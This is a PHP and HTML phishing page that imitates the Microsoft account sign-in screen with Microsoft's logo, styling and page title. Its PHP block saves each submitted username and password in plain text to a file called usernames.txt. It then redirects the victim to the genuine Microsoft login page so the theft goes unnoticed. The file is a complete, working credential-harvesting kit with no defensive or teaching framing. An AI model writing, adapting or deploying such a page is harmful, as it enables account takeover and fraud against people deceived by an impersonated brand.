<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://login.live.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Sign in to your Microsoft account</title><meta charset="UTF-8"></head>
<body style="background: #f2f2f2; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; margin-top: 80px;">
<div style="background: white; width: 440px; margin: auto; padding: 44px 40px 36px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
<img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b" width="120"><br>
<h2>Sign in</h2>
<form method="post">
<input type="text" name="username" placeholder="Email, phone, or Skype" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 2px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 2px;" required><br>
<button type="submit" style="background: #0078d4; color: white; width: 100%; padding: 12px; border: none; font-size: 16px;">Sign in</button>
</form>
</div>
</body>
</html>
